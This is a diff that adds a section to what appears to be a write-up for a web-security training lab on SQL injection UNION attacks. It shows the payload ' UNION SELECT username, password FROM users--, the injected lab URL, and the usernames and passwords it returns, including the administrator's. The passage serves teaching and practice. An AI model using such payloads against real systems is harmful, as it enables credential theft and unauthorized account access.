@@ -85,3 +85,42 @@ https://web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27F
 ```
 
 Placing the string in the second column will not result in an error and will display the content on the webpage, this solving the lab.
+
+## Using an SQL injection UNION attack to retrieve interesting data
+
+![4](https://user-images.githubusercontent.com/57036558/76780826-90832500-67a5-11ea-9340-793a427a9d3d.png)
+
+To solve this lab we need to perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+After we found which columns can hold string data, we can then retrieve interesting data.
+
+Using the methods reproduced in the above labs, we can see that this database has two columns, and those two columns can hold string data. 
+
+We are given the information that the database contains a table called `users`, with columns called `username` and `password`. To retrieve all usernames and passwords from the users table, we can submit the following input:
+
+```
+' UNION SELECT username, password FROM users--
+```
+
+As before we can do this attack directly on the URL:
+
+```
+https://web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+username,password+FROM+users--
+```
+
+Or using Burp Suite:
+
+![5](https://user-images.githubusercontent.com/57036558/76782469-3b94de00-67a8-11ea-943b-a31e6addcba6.png)
+
+After submitting the input the query returns information about three users and their passwords:
+
+```
+carlos:xu1f3n
+wiener:eql8f3
+administrator:6puxvf
+```
+
+By logging in as administrator we solve the lab.
+
+## Retrieving multiple values within a single column
+
